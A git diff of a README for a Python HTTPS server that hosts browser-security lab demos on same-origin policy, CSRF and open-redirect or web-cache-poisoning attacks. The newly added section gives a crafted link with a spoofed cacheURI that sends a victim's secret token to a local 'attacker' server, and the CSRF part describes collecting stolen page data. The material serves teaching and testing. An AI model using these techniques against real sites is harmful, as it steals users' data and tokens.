@@ -96,9 +96,9 @@ This is a multi-threaded HTTPS server based on python's simple http server. It i
 
 ## Same-origin browser test
 
-![](demos/poc_sop_alt.gif)
+![](demos/poc_sop.gif)
 
-The html page in `/demos/sop` can be used to test the behaviour of various browsers (many old ones supported) when it comes to cross-origin requests.
+`/demos/sop` can be used to test the behaviour of various browsers (many old ones supported) when it comes to cross-origin requests.
 
   * `getSecret.html`: fetches `/secret/secret.txt` or `/secret/secret.png` using 6 different methods (see below), for each requesting 5 CORS combinations from the server (see below); supported URL parameters:
     - `host`: the full hostname/IP address:port of the target
@@ -129,7 +129,7 @@ You have these options for CORS testing:
 1. Start the server on all interfaces (default):
 
 ```bash
-python3 simple.py -S -l demos/sop/logs/requests_vary_host.log
+python3 simple.py -l demos/sop/logs/requests_vary_host.log
 ```
 
 Visit:
@@ -143,7 +143,7 @@ replacing `<IP_1>` and `<IP_2>` with two different interfaces, e.g. `127.0.0.1` 
 2. Alternatively, start it only on one interface:
 
 ```bash
-python3 simple.py -S -a <IP> -l demos/sop/logs/requests_vary_host.log
+python3 simple.py -a <IP> -l demos/sop/logs/requests_vary_host.log
 ```
 
 and use a DNS name which resolves to the interface's IP address:
@@ -163,8 +163,8 @@ You can omit the hostname URL parameter if listening on `localhost` and `localho
 3. Alternatively, run two different instances on one interface but different ports:
 
 ```bash
-python3 simple.py -S -a <IP> -p 58081 -l demos/sop/logs/requests_vary_port_target.log
-python3 simple.py -S -a <IP> -p 58082 -l demos/sop/logs/requests_vary_port_origin.log
+python3 simple.py -a <IP> -p 58081 -l demos/sop/logs/requests_vary_port_target.log
+python3 simple.py -a <IP> -p 58082 -l demos/sop/logs/requests_vary_port_origin.log
 ```
 
 then visit:
@@ -198,7 +198,7 @@ The folder already contains logs and results for many browsers.
 
 ![](demos/poc_csrf.gif)
 
-The html pages in `/demos/csrf` can be used to test for [CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29) vulnerabilities.
+`/demos/csrf` can be used to test for [CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29) vulnerabilities.
 
   * `getData.html`: requests a new cache UUID for saving the exfiltrated data to and presents you with an input field where you put the URL of the secret page you want to fetch via the victim; then generates a URL for the victim to click on (`evil.html`); supported URL parameters:
     - `post`: fetch target using POST instead of GET
@@ -214,7 +214,7 @@ The "victim" (`evil.html`) and "attacker" (`getData.html`) must be loaded in dif
 Start the server on any interface, e.g.:
 
 ```bash
-python3 simple.py -S
+python3 simple.py
 ```
 
 Visit `getData.html` in one browser:
@@ -229,14 +229,61 @@ then input the target URL in the input box, e.g.:
 https://<IP>:58080/secret/secret.html
 ```
 
-Copy the generated victim URL. Click on the link "Click here to wait for the stolen data". Open the copied link in another browser.
+Copy the generated victim URL. Click on the link "Click here to wait for the
+stolen data". Open the copied link in another browser.
 Refresh the cached page to see the stolen secret data.
 
 Note: The cached page should refresh itself every 30s.
 
 ## Stealing information via web cache poisoning or open redirects
 
-TO DO (uses `/goto`)
+Often times websites will redirect users or submit user data to external
+domains without validating them, even if the target could be controlled by an
+attcker. Usually this happens if the application exposes internal data in a way
+it can be tampered with by a malicious user. Two common examples are:
+  * Open redirect: A vulnerable page may redirect the user based on a URL
+    parameter, which is normally set by another page on the app; e.g. `/admin`
+    send an unauthenticated user to `/login?returnURL=%2fadmin` and `/login`
+    trusts the `redirectURL` parameter. A successful login may also append secret
+    authentication tokens to the URL it redirects to as is often done in OpenID
+    and OAuth implementations.
+  * Web cache poisoning: A web application is hidden behind a caching proxy and
+    dynamically updates all links on it to point to the domain name in the
+    `X-Forwarded-Host` header, which is normally set by the proxy and not
+    checked. The proxy may erroneously serve cached content with a malicious
+    attacker-supplied `X-Forwarded-Host` to other victim users.
+
+`demos/evil_proxy/vuln.html` is a simple example of a vulnerable page which
+takes the path of a caching endpoint (e.g. `/cache`) from a URL parameter
+without validating it. It then asks the caching endpoint for a new random
+token, which should be kept secret, and submits to it sensitive data available
+only to the user viewing the page.
+
+#### Running the server
+
+The "attacker" and the vulnerable application should be on different origins:
+
+Vulnerable web app:
+
+```bash
+python3 simple.py -p 58080
+```
+
+Attacker:
+
+```bash
+python3 simple.py -O -c -p 58081
+```
+
+The "attacker" sends the "victim" the following link with a spoofed `cacheURI`:
+
+```
+http://localhost:58080/demos/evil_proxy/vuln.html?cacheURI=http%3a%2f%2f127.0.0.1:58081%2fgoto%2f%2fcache
+```
+
+![](demos/poc_evil_proxy_token.png)
+
+![](demos/poc_evil_proxy_token.gif)
 
 # Usage
 
